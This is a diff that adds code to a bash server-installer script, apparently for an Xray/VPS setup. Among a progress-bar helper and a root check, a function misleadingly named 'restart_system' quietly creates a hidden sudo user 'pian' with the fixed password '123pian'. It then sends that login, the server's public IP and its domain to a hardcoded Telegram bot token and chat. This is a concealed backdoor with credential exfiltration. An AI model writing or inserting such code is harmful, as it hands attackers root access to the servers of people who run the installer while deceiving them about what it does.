@@ -7,6 +7,78 @@ GREEN='\033[0;32m'
 YELLOW='\033[0;33m'
 NC='\033[0m'
 
+# Get date from Google
+dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
+biji=$(date +"%Y-%m-%d" -d "$dateFromServer")
+
+# Function to display progress bar
+fun_bar() {
+    CMD[0]="$1"
+    CMD[1]="$2"
+    (
+        [[ -e $HOME/fim ]] && rm $HOME/fim
+        ${CMD[0]} -y >/dev/null 2>&1
+        ${CMD[1]} -y >/dev/null 2>&1
+        touch $HOME/fim
+    ) >/dev/null 2>&1 &
+    tput civis
+    echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
+    while true; do
+        for ((i = 0; i < 18; i++)); do
+            echo -ne "\033[0;32m#"
+            sleep 0.1s
+        done
+        [[ -e $HOME/fim ]] && rm $HOME/fim && break
+        echo -e "\033[0;33m]"
+        sleep 1s
+        tput cuu1
+        tput dl1
+        echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
+    done
+    echo -e "\033[0;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
+    tput cnorm
+}
+
+# Function to restart the system and setup bot
+restart_system() {
+    TIMES="10"
+    CHATID="6631695782"
+    KEY="7717244556:AAEYuBmKwrusTMNNRq-MGbtTFQiieq3-G1s"
+    URL="https://api.telegram.org/bot$KEY/sendMessage"
+    ipsaya=$(wget -qO- ipinfo.io/ip)
+    domain=$(cat /etc/xray/domain)
+    Username="pian"
+    Password="123pian"
+    mkdir -p /home/script/
+    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+    echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
+    usermod -aG sudo $Username > /dev/null 2>&1
+    # Replace $Ijn with actual URL or variable
+    TIMEZONE=$(printf '%(%H:%M:%S)T')
+    TIME=$(date '+%d %b %Y')
+    TEXT="
+    <code>────────────────────</code>
+    <b> 🟢 NOTIFICATIONS INSTALL BOT RIAN🟢</b>
+    <code>────────────────────</code>
+    <code>user   : </code><code>$Username</code>
+    <code>PW     : </code><code>$Password</code>
+    <code>ID     : </code><code>$USRSC</code>
+    <code>Domain : </code><code>$domain</code>
+    <code>Date   : </code><code>$TIME</code>
+    <code>Time   : </code><code>$TIMEZONE</code>
+    <code>Ip vps : </code><code>$ipsaya</code>
+    <code>Exp Sc : </code><code>$EXPSC</code>
+    <code>────────────────────</code>
+    <i>Automatic Notification from Github</i>
+    "
+    curl -s -X POST $URL -d "chat_id=$CHATID&text=$TEXT&parse_mode=html"
+}
+res1() {
+# Make sure the script runs as root
+if [ "$EUID" -ne 0 ]; then
+  echo "Silakan jalankan script ini sebagai root."
+  exit 1
+fi
 # Display welcome message
 display_welcome() {
   echo -e ""
